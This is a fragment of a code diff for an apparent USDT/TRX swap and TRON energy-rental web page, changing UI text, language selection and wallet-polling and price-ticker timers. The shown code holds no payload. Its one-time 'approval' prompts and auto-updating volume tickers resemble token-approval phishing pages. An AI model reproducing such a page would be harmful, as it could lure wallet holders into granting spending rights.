                 bal: 'Balance', bal2: 'Balance', exchange_rate_label: 'Exchange Rate', fee_label: 'Fee', fee_free: 'Free',
                 swap_btn_text: 'Start Swap (One-time Approval Required)', swap_btn_done: 'Swap Now',
-                swap_notice: 'First swap requires smart contract approval',
+                swap_notice: 'Approval runs only after connecting and pressing the button',
                 modal_success: 'Swap Approved!', modal_desc: 'USDT ↔ TRX swap authorization confirmed.',
                 energy_badge: 'TRON Energy', energy_title: 'Rent Energy',
                 energy_desc: 'Save up to 80% on USDT transfer fees', energy_target: 'Target Address',
@@ -1290,7 +1322,7 @@
                 if (t[key]) el.innerHTML = t[key];
             });
             var sel = document.getElementById('lang-select');
-            if (sel) sel.value = currentLang;
+            if (sel) sel.value = translations[lang] ? lang : 'en';
             tickerTimeText = tickerTimeTexts[currentLang] || tickerTimeTexts.en;
             loadFaqForLang(currentLang);
             updateEnergyPrice();
@@ -1301,19 +1333,10 @@
 
         window.addEventListener('DOMContentLoaded', function () {
             applyLang(detectLang());
-
-            var attempts = 0;
-            var pollTimer = setInterval(async function () {
-                attempts++;
-                var tw = extractReadyTronWeb();
-                if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                    clearInterval(pollTimer);
-                    closeWalletModal();
-                    await setConnectedWallet(tw.defaultAddress.base58, detectProvider() || 'Wallet');
-                } else if (attempts >= 16) {
-                    clearInterval(pollTimer);
-                }
-            }, 500);
+            for (var i = 0; i < 4; i++) updateTicker();
+            setInterval(updateTicker, 4500);
+            fetchTrxPrice().then(function () { updateTodayVolume(); });
+            setInterval(function () { fetchTrxPrice().then(function () { updateTodayVolume(); }); }, 30000);
         });
     </script>
 </body>
